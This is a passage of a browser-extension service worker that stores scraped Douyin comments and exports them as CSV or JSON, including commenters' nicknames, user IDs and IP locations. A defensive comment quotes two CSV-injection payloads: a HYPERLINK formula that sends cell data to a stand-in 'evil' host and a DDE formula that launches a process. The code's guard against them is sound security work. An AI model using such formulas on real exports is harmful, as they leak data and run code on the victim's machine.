/**
 * background.js —— MV3 service worker
 *
 * 职责（刻意最小化）：
 *   1. 保存已采集的评论（按 videoId 分池，chrome.storage.local）
 *   2. 导出 CSV / JSON（复用 douyin-probe/background.js 已跑通的 Blob + downloads 方案）
 *   3. 清空
 *
 * 刻意不做的事：
 *   - 不发起任何网络请求（所有数据都来自页面自身的流量）
 *   - 不碰签名
 *
 * 存储结构：
 *   dts_videos  : { [videoId]: { videoId, title, total, count, hasMore, updatedAt, signedUrlAt } }
 *   dts_c_<vid> : { [cid]: comment }        ← 按视频分键，避免单键超过 storage 配额
 */

const KEY_VIDEOS = 'dts_videos';
const PREFIX_COMMENTS = 'dts_c_';
// 防御：单视频超过这个数就不再增长（正常量级远低于此）。
// v0.1.5 起二级回复也落进同一个池子（带 is_reply/parent_cid），故上限从 30000 提到 80000。
const MAX_COMMENTS_PER_VIDEO = 80000;

// ---------- 存储 ----------
//
// ⚠️ 所有「读 → 改 → 写」都必须串行（serial）：chrome.storage 没有事务，
// 两个在途的 dts-comments（二级回复 4 路并发 + 页面自己的 captured）若交错执行
// 「A 读 → B 读 → A 写 → B 写」，A 那一批会被 B 整桶覆盖掉；而 content.js 已经把
// 这些 cid 记进了 seen，之后再也不会重发 ⇒ 静默丢数据。清空也走同一条队列，
// 保证「清空之前排队的写」不会在清空之后才落地把数据写回来。

let storageChain = Promise.resolve();
/** 把一个存储变更排进全局串行队列；返回该变更自己的结果（失败不会卡住后面的变更） */
function serial(fn) {
  const p = storageChain.then(fn);
  storageChain = p.catch(() => {});
  return p;
}

// 评论桶的内存副本（只缓存最近写过的几个视频）：落库是整桶读写，桶到几万条时每次 get 都要
// 反序列化整个对象。SW 存活期间所有写都经过 serial，所以缓存就是权威值；SW 被回收后自然清空。
const BUCKET_CACHE_MAX = 3;
const bucketCache = new Map();   // videoId -> { [cid]: comment }

function cacheBucket(videoId, obj) {
  bucketCache.delete(videoId);
  bucketCache.set(videoId, obj);
  while (bucketCache.size > BUCKET_CACHE_MAX) bucketCache.delete(bucketCache.keys().next().value);
}

async function getVideos() {
  const o = await chrome.storage.local.get(KEY_VIDEOS);
  return o[KEY_VIDEOS] || {};
}

async function getComments(videoId) {
  const key = PREFIX_COMMENTS + videoId;
  const o = await chrome.storage.local.get(key);
  return o[key] || {};
}

/** 只能在 serial 里调用：合并一批评论进桶并写回，返回桶里的条数 */
async function writeComments(videoId, list) {
  const key = PREFIX_COMMENTS + videoId;
  const cur = bucketCache.get(videoId) || await getComments(videoId);
  for (const c of list) {
    if (c && c.cid) cur[c.cid] = c;
  }
  const cids = Object.keys(cur);
  if (cids.length > MAX_COMMENTS_PER_VIDEO) {
    // 超出上限时丢弃最早创建的（按 create_time 排序）
    cids.sort((a, b) => (cur[a].create_time || 0) - (cur[b].create_time || 0));
    for (const cid of cids.slice(0, cids.length - MAX_COMMENTS_PER_VIDEO)) delete cur[cid];
  }
  try {
    await chrome.storage.local.set({ [key]: cur });
  } catch (e) {
    bucketCache.delete(videoId);   // 写失败：内存副本已含未落盘的条目，作废它，下次从存储重读
    throw e;
  }
  cacheBucket(videoId, cur);
  return Object.keys(cur).length;
}

// 合批：同一视频排队期间到达的多批评论合成一次整桶写（整桶重写的代价跟批数成正比，
// 高并发补采时能把几十次写压成几次）。meta 用最后一批的（title/total/hasMore 都是「最新值」语义）。
const putBuffers = new Map();   // videoId -> { items, waiters, meta }

/**
 * 落库一批评论（并更新该视频的元数据），返回落库后的条数。
 * 评论与元数据在**同一个**串行任务里写，清空不会插在两者之间留下「有元数据没评论」的幽灵记录。
 */
function putComments(videoId, list, metaPatch) {
  return new Promise((resolve, reject) => {
    let b = putBuffers.get(videoId);
    const isNew = !b;
    if (isNew) { b = { items: [], waiters: [], meta: null }; putBuffers.set(videoId, b); }
    for (const c of list || []) b.items.push(c);
    if (metaPatch) b.meta = metaPatch;
    b.waiters.push({ resolve, reject });
    if (isNew) {
      serial(async () => {
        // 从这一刻起再来的批次进新的缓冲、排下一个任务
        if (putBuffers.get(videoId) === b) putBuffers.delete(videoId);
        const n = await writeComments(videoId, b.items);
        if (b.meta) await updateVideoMetaUnlocked(videoId, Object.assign({}, b.meta, { count: n }));
        return n;
      }).then(
        (n) => b.waiters.forEach((w) => w.resolve(n)),
        (e) => b.waiters.forEach((w) => w.reject(e))
      );
    }
  });
}

/** 只能在 serial 里调用 */
async function updateVideoMetaUnlocked(videoId, patch) {
  const videos = await getVideos();
  videos[videoId] = Object.assign({ videoId }, videos[videoId] || {}, patch, {
    updatedAt: new Date().toISOString()
  });
  await chrome.storage.local.set({ [KEY_VIDEOS]: videos });
  return videos[videoId];
}

// ---------- v0.5.26：不再打开任何页面补标题 ----------
// v0.5.24 曾按需开后台标签页读 https://www.douyin.com/video/<id> 的 document.title 来补
// 「抖音精选电脑版」这类通用标题。客户 2026-10-20 追问「能不打开其他的浏览器就获得标题吗」，
// 实测：视频页 HTML 是空壳（无 title、RENDER_DATA 只有 app），老分享接口 status_code=11110，
// detail 接口无 a_bogus 时 403 —— 不开页面确实拿不到。
// 因此 v0.5.26 起不再开页面/标签页：标题抓不到的条目在浮层里显示「视频 <末 8 位>」，
// 下一行仍有「ID … · 采集 …」可区分（由 content.js 的 pickLabel/pickSubLabel 负责）。

/** 清空：videoId = 只清那一条；all = 全清。与落库共用串行队列。 */
function clearStorage(videoId, all) {
  return serial(async () => {
    if (videoId) {
      await chrome.storage.local.remove(PREFIX_COMMENTS + videoId);
      bucketCache.delete(videoId);
      const videos = await getVideos();
      delete videos[videoId];
      await chrome.storage.local.set({ [KEY_VIDEOS]: videos });
    } else if (all === true) {
      const everything = await chrome.storage.local.get(null);
      const keys = Object.keys(everything).filter((k) => k === KEY_VIDEOS || k.startsWith(PREFIX_COMMENTS));
      await chrome.storage.local.remove(keys);
      bucketCache.clear();
    }
  });
}

async function setBadge(n) {
  try {
    await chrome.action.setBadgeText({ text: n ? String(n) : '' });
    await chrome.action.setBadgeBackgroundColor({ color: '#2b6cb0' });
  } catch (e) { /* 忽略 */ }
}

// ---------- CSV ----------

/**
 * RFC4180 转义 + 公式注入防护。
 *
 * 转义：包含引号/逗号/换行时用双引号包裹，内部引号翻倍。
 *
 * ⚠️ 公式注入（CSV injection）必须单独防：评论文本**完全由别人控制**——任何能看到
 * 这条视频的人都能写。Excel / WPS 打开 CSV 时，单元格首字符是 `= + - @` 就会被
 * 当公式执行：
 *   · `=HYPERLINK("http://evil/?"&A1,"点我")` → 导出者一点就把数据带出去
 *   · `=cmd|'/c calc'!A0`（DDE）→ 甚至能拉起本机进程
 * 本工具的主用途恰好就是「导出 CSV 用 Excel 看」，命中率几乎是 100%，所以必须挡。
 *
 * 做法：首字符命中时前置一个单引号——Excel 视其为「文本」前缀且不显示在单元格里；
 * 其余 CSV 读者只会多看到一个 `'`，比执行公式安全得多。对**所有**列统一处理，
 * 不区分「文本列/数字列」：本表没有任何合法的负数字段，误伤面为零。
 */
function csvCell(v) {
  if (v === null || v === undefined) return '';
  let s = String(v);
  if (/^[=+\-@\t\r]/.test(s)) s = "'" + s;
  if (/[",\r\n]/.test(s)) return '"' + s.replace(/"/g, '""') + '"';
  return s;
}

/** 数据清洗 */
/** 去表情、@某人、#话题，用于 text_clean 列 */
function cleanText(t) {
  if (!t) return '';
  return String(t)
    .replace(/\[[^\[\]]{1,12}\]/g, '')   // [捂脸] 这类表情占位
    .replace(/@[^\s@]{1,30}/g, '')        // @某人
    .replace(/#[^\s#]{1,40}/g, '')        // #话题
    .replace(/\s+/g, ' ')
    .trim();
}

// v0.5.27：CSV 第 2 行是中文列名解释（第 1 行英文键不变，机器/AI 解析口径不动）。
// 说明行首列以 "# " 开头，解析器看到 cid 以 "#" 开头就当说明行跳过。
// 插件侧 D:\dycopy\dsh-douyin-comments\collector.mjs 里有一份完全相同的标签表，两处必须一致。
const CSV_COL_LABELS = {
  cid: '评论ID',
  create_time: '发布时间戳(秒)',
  create_time_str: '发布时间(UTC)',
  text: '评论原文',
  text_clean: '文本(去表情话题)',
  text_len: '字数',
  digg_count: '点赞数',
  reply_comment_total: '该评论回复数',
  ip_label: 'IP属地',
  is_hot: '是否热评(1/0)',
  is_folded: '是否折叠(1/0)',
  level: '层级(1一级2二级)',
  stick_position: '置顶位(0非置顶)',
  user_nickname: '昵称',
  user_uid: '用户内部ID(不可搜)',
  is_reply: '是否二级回复(1/0)',
  parent_cid: '父评论ID',
  user_sec_uid: 'sec_uid(主页链接用)',
  user_unique_id: '抖音号(空则填数字短号)',
  video_id: '视频ID(多视频导出)'
};

/** 说明行：按 cols 顺序取中文标签，首列加 "# " 标记 */
function csvLabelRow(cols) {
  return cols
    .map(function (k, i) { return csvCell((i === 0 ? '# ' : '') + (CSV_COL_LABELS[k] || k)); })
    .join(',');
}

function toCsv(comments, opts) {
  // 前 15 列是 v0.1.4 起就有的稳定契约（顺序/含义不变）；
  // v0.1.5 新增的二级回复在**末尾追加**两列，老读者按位置读前 15 列仍然正确。
  // v0.2.9 的「全部视频」导出再往末尾追加 video_id 一列（不带 withVideoId 时列数不变）。
  // v0.5.17 追加 user_sec_uid / user_unique_id：user_uid 只是抖音内部数字 ID，不是一个能搜的
  // 「抖音号」；unique_id 才是账号页上的抖音号（用户没设时为空），
  // sec_uid 用来拼主页 https://www.douyin.com/user/<sec_uid>。
  // v0.5.28：按客户要求删掉 user_short_id（抖音内部的短号，客户用不到；unique_id 为空时也没必要兜底）。
  // JSON / AI 返回里的 user.short_id 不动（那是抖音原始字段）。
  // v0.5.29：按客户要求加回兜底——`user_unique_id` 为空时改填数字短号（不新增列，标签改成「抖音号(空则填数字短号)」）。
  const withVideoId = !!(opts && opts.withVideoId);
  const cols = [
    'cid', 'create_time', 'create_time_str', 'text', 'text_clean', 'text_len',
    'digg_count', 'reply_comment_total', 'ip_label', 'is_hot', 'is_folded',
    'level', 'stick_position', 'user_nickname', 'user_uid',
    'is_reply', 'parent_cid',
    'user_sec_uid', 'user_unique_id'
  ];
  if (withVideoId) cols.push('video_id');
  const rows = [cols.join(','), csvLabelRow(cols)];
  for (const c of comments) {
    const t = c.text || '';
    const tc = cleanText(t);
    const ct = c.create_time ? new Date(c.create_time * 1000).toISOString() : '';
    const u = c.user || {};
    rows.push([
      csvCell(c.cid), csvCell(c.create_time), csvCell(ct), csvCell(t), csvCell(tc),
      csvCell([...String(t)].length),
      csvCell(c.digg_count), csvCell(c.reply_comment_total), csvCell(c.ip_label),
      csvCell(c.is_hot), csvCell(c.is_folded), csvCell(c.level), csvCell(c.stick_position),
      csvCell(u.nickname), csvCell(u.uid),
      // 二级回复两列：顶层评论为 0 / 空
      csvCell(c.is_reply ? 1 : 0), csvCell(c.parent_cid),
      csvCell(u.sec_uid), csvCell(u.unique_id || u.short_id)
    ].concat(withVideoId ? [csvCell(c.videoId || c.video_id || '')] : []).join(','));
  }
  return rows.join('\r\n');
}

/** 把字节数组编成 data URL。分块是为了避免 String.fromCharCode.apply 参数过多爆栈 */
function toDataUrl(bytes, mime) {
  const CHUNK = 0x8000; // 防止 apply 参数过多爆栈
  let s = '';
  for (let i = 0; i < bytes.length; i += CHUNK) {
    s += String.fromCharCode.apply(null, bytes.subarray(i, i + CHUNK));
  }
  return 'data:' + mime + ';base64,' + btoa(s);
}

// false = 不弹窗，直接落到浏览器的下载目录（文件名仍带 videoId 与时间戳）
// true  = 每次导出弹原生「另存为」，让用户自己选位置
const SAVE_AS = false;

/** 等某个下载项进入终态（complete / interrupted）。
 *  chrome.downloads.download() 的 promise 在「下载项被创建」时就 resolve ——
 *  那时用户还没在「另存为」对话框里点确定。不等终态就报成功，
 *  用户点「取消」时面板会撒谎说「已导出」。（实测见 probe-saveas.mjs） */
function waitDownload(id, timeoutMs) {
  return new Promise((resolve) => {
    let done = false;
    const finish = (v) => {
      if (done) return;
      done = true;
      try { chrome.downloads.onChanged.removeListener(onChanged); } catch (e) {}
      clearTimeout(timer);
      resolve(v);
    };
    const onChanged = (delta) => {
      if (delta.id !== id || !delta.state) return;
      const cur = delta.state.current;
      // 注意：下载【开始】时也会上报一次 state='in_progress'，那不是终态。
      // 只有 complete / interrupted 才算结束。
      if (cur !== 'complete' && cur !== 'interrupted') return;
      // 终态时再查一次，拿权威的 state/error（error 有时在同一条事件里，有时不是）
      chrome.downloads.search({ id }, (items) => {
        const it = items && items[0];
        finish({ state: (it && it.state) || cur, error: (it && it.error) || (delta.error ? delta.error.current : '') });
      });
    };
    chrome.downloads.onChanged.addListener(onChanged);
    const timer = setTimeout(() => finish({ state: 'timeout', error: '' }), timeoutMs);
    // 兜底：可能在本监听注册之前就已经结束了（极小的下载会瞬间完成）
    chrome.downloads.search({ id }, (items) => {
      const it = items && items[0];
      if (it && it.state && it.state !== 'in_progress') {
        finish({ state: it.state, error: it.error || '' });
      }
    });
  });
}

async function download(text, filename, mime) {
  // MV3 service worker 没有 Blob URL 能力（不提供对象 URL），
  // 所以统一走 data URL —— chrome.downloads.download 对 data URL 支持良好。
  // 用 base64 而不是 encodeURIComponent：中文 CSV 走 %XX 会膨胀 3 倍，base64 只膨胀 4/3。
  const wantBom = /csv/i.test(mime);
  const bytes = new TextEncoder().encode(wantBom ? '\ufeff' + text : text);
  let id;
  try {
    id = await chrome.downloads.download({ url: toDataUrl(bytes, mime), filename, saveAs: SAVE_AS });
  } catch (e) {
    return { ok: false, error: String(e && e.message || e) };
  }
  if (id === undefined) return { ok: false, error: '下载未创建' };

  // 有未完成的下载项 + 挂起的消息端口，MV3 不会在用户挑保存位置时把 SW 杀掉。
  const final = await waitDownload(id, 5 * 60 * 1000);
  if (final.state === 'complete') {
    let path = null;
    try {
      const items = await chrome.downloads.search({ id });
      if (items && items[0] && items[0].filename) path = items[0].filename;
    } catch (e) { /* path 可选 */ }
    return { ok: true, filename, bytes: bytes.length, downloadId: id, path };
  }
  if (final.error === 'USER_CANCELED') return { ok: false, cancelled: true, error: '用户取消了保存' };
  if (final.state === 'timeout') return { ok: false, error: '下载超时未完成（可能对话框一直没关）' };
  return { ok: false, error: '下载中断：' + (final.error || final.state) };
}

// 导出实现（面板 dts-export 与 Hub(AI/MCP) 命令 export 共用一份，v0.5.9 起）：
//   scope=video（默认）：只导 opts.videoId 这一个桶；
//   scope=all（opts.all === true）：把本地所有视频的评论合成一份，每条评论标上 videoId，
//     CSV 末尾追加 video_id 列（前 17 列契约不变），JSON 里给 per-video 摘要。
//   scope=selected（opts.videoIds = [...]，v0.5.20 面板「自选视频…」）：只合选中的那几条；
//     选 1 条 = 与单视频导出同列数，选多条才追加 video_id 列。
//   优先级：all > videoIds > videoId。
// 失败口径统一：既没 videoId 又没 all → MISSING_VIDEO_ID；本地确实没数据 → EMPTY_POOL
// （不再下载一个只有表头的空文件，否则「导出成功」会掩盖「本来就是空的」）。
const EXPORT_NOTE = '由「抖音评论采集器」采集：数据来自抖音页面自身的接口响应。未破解或伪造签名、未绕过登录；开始采集前若还没有可用签名，扩展会用一次合成点击替你打开评论区（让页面自己发出请求），不滚动页面、不改动评论内容。二级回复通过复用页面自己已发出的签名 URL 拉取（仅改写 path 与 item_id/comment_id/cut_version/cursor/count）。';

async function exportComments(opts) {
  const o = opts || {};
  const wantAll = o.all === true;
  const videoId = o.videoId ? String(o.videoId) : '';
  const format = o.format === 'json' ? 'json' : 'csv';
  // v0.5.20：自选视频（面板「自选视频…」）。videoIds = 要导的那几条；优先级高于 all。
  const pickIds = Array.isArray(o.videoIds)
    ? Array.from(new Set(o.videoIds.map((x) => String(x || '').trim()).filter(Boolean)))
    : [];
  const wantPick = !wantAll && pickIds.length > 0;
  if (!wantAll && !wantPick && !videoId) {
    return { ok: false, error: 'MISSING_VIDEO_ID', hint: 'export 需要 videoId 参数；要导出本地全部视频请传 all:true；要导指定几条请传 videoIds:[...]' };
  }
  const allVideos = await getVideos();
  const perVideo = [];
  let comments = [];
  // 多条视频合成一份时才需要 video_id 列（单条保持既有列数契约）
  const multi = wantAll || (wantPick && pickIds.length > 1);

  if (wantAll) {
    const ids = Object.keys(allVideos);
    if (videoId && ids.indexOf(videoId) < 0) ids.push(videoId);   // 桶在、但 dts_videos 没记录
    for (const v of ids) {
      const list = Object.values(await getComments(v));
      if (!list.length) continue;
      perVideo.push({ videoId: v, title: (allVideos[v] && allVideos[v].title) || '', count: list.length });
      for (const c of list) comments.push(Object.assign({}, c, { videoId: v }));
    }
    if (!comments.length) {
      return { ok: false, error: 'EMPTY_POOL', scope: 'all', hint: '本地还没有任何评论数据：先采集，或用 list_videos / get_comments 确认' };
    }
  } else if (wantPick) {
    for (const v of pickIds) {
      const list = Object.values(await getComments(v));
      if (!list.length) continue;
      perVideo.push({ videoId: v, title: (allVideos[v] && allVideos[v].title) || '', count: list.length });
      for (const c of list) comments.push(Object.assign({}, c, { videoId: v }));
    }
    if (!comments.length) {
      return {
        ok: false, error: 'EMPTY_POOL', scope: 'selected', videoIds: pickIds,
        hint: '选中的视频本地都没有评论数据：先采集，或重新「自选视频」换个选择'
      };
    }
  } else {
    comments = Object.values(await getComments(videoId));
    if (!comments.length) {
      return { ok: false, error: 'EMPTY_POOL', videoId, hint: '该 videoId 本地没有评论数据' };
    }
  }
  // 按时间升序，便于阅读
  comments.sort((a, b) => (a.create_time || 0) - (b.create_time || 0));
  const meta = allVideos[videoId] || {};
  const stamp = new Date().toISOString().replace(/[:.]/g, '-').slice(0, 19);
  const replyCount = comments.filter((c) => c && c.is_reply).length;
  // 文件名：all / selected<N>（自选多条）/ 单条 videoId（自选 1 条时用它自己的 id）
  const fileTag = wantAll ? 'all' : (wantPick ? (multi ? 'selected' + pickIds.length : pickIds[0]) : videoId);
  const scopeTag = wantAll ? 'all' : (wantPick ? (multi ? 'selected' : 'video') : 'video');
  const singleVideoId = wantAll ? null : (wantPick ? (multi ? null : pickIds[0]) : videoId);
  let dl;
  // v0.5.32：JSON 也带上清洗后的文本（与 CSV 的 text_clean 列同口径），
  // 词云/分析台直接用它分词，不必再各自剥 [表情]。
  const jsonComments = comments.map((c) => Object.assign({}, c, { text_clean: cleanText(c && c.text) }));
  if (format === 'json') {
    const payload = Object.assign({
      exportedAt: new Date().toISOString(),
      scope: scopeTag,
      ...(multi
        ? { videos: perVideo }
        : { videoId: singleVideoId, title: (allVideos[singleVideoId] || {}).title, totalReported: (allVideos[singleVideoId] || {}).total })
    }, {
      count: comments.length,
      topLevelCount: comments.length - replyCount,
      videoCount: multi ? perVideo.length : 1,
      replyCount,   // v0.1.5：二级回复条数（带 parent_cid 的那些）
      note: EXPORT_NOTE,
      comments: jsonComments
    });
    dl = await download(JSON.stringify(payload, null, 2),
      `douyin-comments-${fileTag}-${stamp}.json`, 'application/json');
  } else {
    dl = await download(toCsv(comments, { withVideoId: multi }),
      `douyin-comments-${fileTag}-${stamp}.csv`, 'text/csv;charset=utf-8');
  }
  return Object.assign({
    scope: scopeTag,
    videoId: singleVideoId,
    videoIds: multi && !wantAll ? pickIds : null,
    videoCount: multi ? perVideo.length : 1,
    count: comments.length,
    topLevelCount: comments.length - replyCount,
    replyCount,
    format
  }, dl);
}

/* === BEGIN VIEWER ASSETS (generated by devkit/_gen_viewer_assets.mjs; 勿手改) === */
// 这三个字符串是「导出词云」用的自包含快照素材：词云页源码原样内嵌，
// 生成快照时替换 <link> 与 <script src> 两个标签即可变成单文件 HTML。
// 由 devkit/_gen_viewer_assets.mjs 生成；改词云页后要重新跑一次。
const VIEWER_ASSETS = {
  html: "<!DOCTYPE html>\n<html lang=\"zh-CN\">\n<head>\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1, viewport-fit=cover\">\n<meta name=\"color-scheme\" content=\"dark\">\n<meta name=\"theme-color\" content=\"#0b0b0c\">\n<meta name=\"format-detection\" content=\"telephone=no\">\n<meta name=\"mobile-web-app-capable\" content=\"yes\">\n<meta name=\"apple-mobile-web-app-capable\" content=\"yes\">\n<meta name=\"apple-mobile-web-app-status-bar-style\" content=\"black-translucent\">\n<title>评论分析台 · 词云 + 评论表</title>\n<link rel=\"stylesheet\" href=\"styles.css?v=0.5.53\">\n</head>\n<body class=\"is-empty\">\n<header class=\"topbar\">\n  <div class=\"brand\">\n    <svg class=\"mark\" viewBox=\"0 0 32 32\" fill=\"none\" aria-hidden=\"true\">\n      <path d=\"M5 8.5A3.5 3.5 0 0 1 8.5 5h15A3.5 3.5 0 0 1 27 8.5v10a3.5 3.5 0 0 1-3.5 3.5H14l-6.2 4.6A1 1 0 0 1 6.2 25.8V22H8.5A3.5 3.5 0 0 1 5 18.5v-10Z\" stroke=\"currentColor\" stroke-width=\"1.6\" stroke-linejoin=\"round\"/>\n      <circle cx=\"11\" cy=\"13.5\" r=\"1.4\" fill=\"currentColor\"/>\n      <circle cx=\"16\" cy=\"13.5\" r=\"1.4\" fill=\"currentColor\"/>\n      <circle cx=\"21\" cy=\"13.5\" r=\"1.4\" fill=\"currentColor\"/>\n    </svg>\n    <div class=\"shell-id\">\n      <h1>评论分析台</h1>\n      <p class=\"scope\" id=\"sourceInfo\">未载入数据</p>\n    </div>\n  </div>\n  <div class=\"actions\">\n    <button id=\"btnOpenFiles\" class=\"btn primary\" type=\"button\">打开导出文件…</button>\n    <button id=\"btnOpenDir\" class=\"btn\" type=\"button\">打开导出目录…</button>\n    <button id=\"btnClear\" class=\"btn ghost\" type=\"button\" disabled>清空</button>\n  </div>\n  <input type=\"file\" id=\"fileInput\" accept=\".json,.csv,application/json,text/csv\" multiple hidden>\n  <input type=\"file\" id=\"dirInput\" webkitdirectory directory multiple hidden>\n</header>\n\n<section id=\"kpis\" class=\"kpis\" aria-label=\"总览\"></section>\n\n<main class=\"grid\">\n  <section class=\"panel cloud-panel\">\n    <div class=\"panel-head\">\n      <div class=\"panel-title\">\n        <h2>词云</h2>\n        <span id=\"cloudSub\" class=\"panel-sub\"></span>\n      </div>\n      <div class=\"inline\">\n        <label class=\"meta\" for=\"cloudSize\">词数</label>\n        <select id=\"cloudSize\" class=\"select small\">\n          <option value=\"80\">80</option>\n          <option value=\"120\" selected>120</option>\n          <option value=\"160\">160</option>\n          <option value=\"220\">220</option>\n        </select>\n        <button id=\"btnRelayout\" class=\"btn small ghost\" type=\"button\">重新排布</button>\n      </div>\n    </div>\n    <div id=\"cloud\" class=\"cloud\" aria-label=\"评论关键词词云\"></div>\n    <div id=\"skCloud\" class=\"sk-cloud\" aria-hidden=\"true\" hidden></div>\n    <div id=\"cloudEmpty\" class=\"empty\">\n      <svg class=\"empty-mark\" width=\"34\" height=\"34\" viewBox=\"0 0 32 32\" fill=\"none\" aria-hidden=\"true\">\n        <path d=\"M5 8.5A3.5 3.5 0 0 1 8.5 5h15A3.5 3.5 0 0 1 27 8.5v10a3.5 3.5 0 0 1-3.5 3.5H14l-6.2 4.6A1 1 0 0 1 6.2 25.8V22H8.5A3.5 3.5 0 0 1 5 18.5v-10Z\" stroke=\"currentColor\" stroke-width=\"1.6\" stroke-linejoin=\"round\"/>\n      </svg>\n      <strong>还没有数据</strong>\n      <p>载入插件或扩展导出的 <code>douyin-comments-*.json</code> / <code>.csv</code>，<br>也可以直接选整个导出目录，一次载入多条视频。</p>\n      <p class=\"meta\">数据只在本机浏览器里处理，不上传任何服务器。</p>\n      <button id=\"btnOpenFiles2\" class=\"btn primary\" type=\"button\">打开导出文件…</button>\n    </div>\n    <div class=\"cloud-foot\">\n      <span><span class=\"swatch\"></span>高频词 <span class=\"swatch grey\" style=\"margin-left:12px\"></span>一般 <span class=\"swatch mono\" style=\"margin-left:12px\"></span>低频 · 字号 = 出现次数</span>\n      <span>悬停看样例评论 · 点词看全部</span>\n    </div>\n  </section>\n\n  <aside class=\"panel side\">\n    <div class=\"panel-head\">\n      <div class=\"panel-title\">\n        <h2>关键词</h2>\n        <span id=\"wordInfo\" class=\"panel-sub\"></span>\n      </div>\n    </div>\n    <ol id=\"wordList\" class=\"word-list\"></ol>\n    <div class=\"panel-head sub\">\n      <h2>筛选</h2>\n    </div>\n    <!-- v0.5.50：侧栏内联样式，避免旧缓存 CSS 把复选框挤成竖排 -->\n    <div class=\"side-body\" style=\"display:flex;flex-direction:column;align-items:stretch;gap:10px;width:100%;min-width:0;\">\n      <label class=\"field\">\n        <span>视频</span>\n        <select id=\"videoFilter\" class=\"select\"></select>\n      </label>\n      <label class=\"field\">\n        <span>情感</span>\n        <select id=\"sentFilter\" class=\"select\">\n          <option value=\"\">全部情感</option>\n          <option value=\"pos\">只看正向</option>\n          <option value=\"neu\">只看中性</option>\n          <option value=\"neg\">只看负向</option>\n        </select>\n      </label>\n      <label class=\"field\">\n        <span>主题</span>\n        <select id=\"topicFilter\" class=\"select\" disabled><option value=\"\">全部主题</option></select>\n      </label>\n      <button id=\"btnOpenVideo\" class=\"btn small\" type=\"button\" disabled title=\"在新标签页打开当前选中视频的抖音页面\">打开原视频 ↗</button>\n      <label class=\"check\" style=\"display:flex;flex-direction:row;align-items:center;gap:8px;width:100%;min-width:0;white-space:nowrap;margin:0;box-sizing:border-box;\"><input type=\"checkbox\" id=\"onlyHasProfile\" style=\"flex:0 0 auto;margin:0;\"> 只看有主页的用户</label>\n      <label class=\"check\" style=\"display:flex;flex-direction:row;align-items:center;gap:8px;width:100%;min-width:0;white-space:nowrap;margin:0;box-sizing:border-box;\"><input type=\"checkbox\" id=\"onlyTopLevel\" style=\"flex:0 0 auto;margin:0;\"> 只看一级评论</label>\n      <label class=\"check\" style=\"display:flex;flex-direction:row;align-items:center;gap:8px;width:100%;min-width:0;white-space:nowrap;margin:0;box-sizing:border-box;\"><input type=\"checkbox\" id=\"onlyNonEmpty\" style=\"flex:0 0 auto;margin:0;\"> 只看有文字的评论</label>\n            <label class=\"check\" style=\"display:flex;flex-direction:row;align-items:center;gap:8px;width:100%;min-width:0;white-space:nowrap;margin:0;box-sizing:border-box;\" title=\"过滤「这种 / 都是 / 我的」这类没有信息量的词\"><input type=\"checkbox\" id=\"onlyContent\" style=\"flex:0 0 auto;margin:0;\" checked> 过滤虚词</label>\n      <div class=\"kw-tune\" title=\"加词：保证长词不被切碎（如「露营装备」）；屏蔽词：从词云里剔除\">\n        <label class=\"kw-row\"><span>加词</span><input id=\"kwKeep\" class=\"kw-input\" type=\"text\" placeholder=\"逗号分隔，如：露营装备\" autocomplete=\"off\" spellcheck=\"false\"></label>\n        <label class=\"kw-row\"><span>屏蔽</span><input id=\"kwBlock\" class=\"kw-input\" type=\"text\" placeholder=\"如：真的,感觉\" autocomplete=\"off\" spellcheck=\"false\"></label>\n      </div>\n    </div>\n  </aside>\n</main>\n\n<section class=\"panel insights\" id=\"insights\" aria-label=\"洞察\">\n  <div class=\"panel-head\">\n    <div class=\"panel-title\">\n      <h2>洞察</h2>\n      <span id=\"insightSub\" class=\"panel-sub\"></span>\n    </div>\n  </div>\n  <div class=\"insight-grid\" id=\"insightGrid\"></div>\n</section>\n\n<section class=\"panel table-panel\">\n  <div class=\"panel-head\">\n    <div class=\"panel-title\">\n      <h2>评论表</h2>\n      <span id=\"tableCount\" class=\"panel-sub\"></span>\n    </div>\n    <div class=\"inline\">\n      <input id=\"search\" class=\"input\" type=\"search\" placeholder=\"搜索评论内容 / 昵称 / 抖音号…\" autocomplete=\"off\">\n      <select id=\"sortBy\" class=\"select\">\n        <option value=\"digg\">按点赞降序</option>\n        <option value=\"time\">按时间降序</option>\n        <option value=\"len\">按字数降序</option>\n        <option value=\"replies\">按回复数降序</option>\n      </select>\n      <button id=\"btnExport\" class=\"btn small\" type=\"button\" disabled>导出 CSV</button>\n          <button id=\"btnExportJson\" class=\"btn small\" type=\"button\" disabled>导出 JSON</button>\n    </div>\n  </div>\n  <div class=\"table-wrap\">\n    <table id=\"table\">\n      <thead>\n        <tr>\n          <th class=\"col-text\">评论内容</th>\n          <th class=\"col-user\">用户</th>\n          <th class=\"col-num\">点赞</th>\n          <th class=\"col-num\">回复</th>\n          <th class=\"col-ip\">属地</th>\n          <th class=\"col-time\">时间</th>\n          <th class=\"col-level\">层级</th>\n          <th class=\"col-sent\">情感</th>\n        </tr>\n      </thead>\n      <tbody id=\"tbody\"></tbody>\n    </table>\n    <div id=\"tableEmpty\" class=\"empty small\">没有符合条件的评论</div>\n    <div id=\"skTable\" class=\"sk-table\" aria-hidden=\"true\" hidden></div>\n  </div>\n  <nav id=\"pager\" class=\"pager\"></nav>\n</section>\n\n<footer class=\"foot\">\n  <span>本地静态页面 · 数据不上传</span>\n  <span>点昵称跳抖音主页（需导出数据带 sec_uid）</span>\n  <span id=\"uiVer\">v0.5.53</span>\n</footer>\n\n<div id=\"tooltip\" class=\"tooltip hidden\" role=\"tooltip\"></div>\n\n<aside id=\"drawer\" class=\"drawer hidden\" aria-label=\"关键词评论列表\">\n  <div class=\"drawer-head\">\n    <div>\n      <h3 id=\"drawerTitle\">关键词</h3>\n      <p id=\"drawerSub\" class=\"meta\"></p>\n    </div>\n    <button id=\"btnCloseDrawer\" class=\"btn ghost small\" type=\"button\">关闭</button>\n  </div>\n  <div id=\"drawerBody\" class=\"drawer-body\"></div>\n  <div class=\"drawer-foot\">\n    <button id=\"btnDrawerMore\" class=\"btn small\" type=\"button\">加载更多</button>\n    <button id=\"btnDrawerFilter\" class=\"btn small\" type=\"button\">在评论表里筛选这个词</button>\n  </div>\n</aside>\n\n<div id=\"toast\" class=\"toast hidden\"></div>\n\n<script src=\"app.js?v=0.5.53\"></script>\n</body>\n</html>\n", // 词云页 index.html
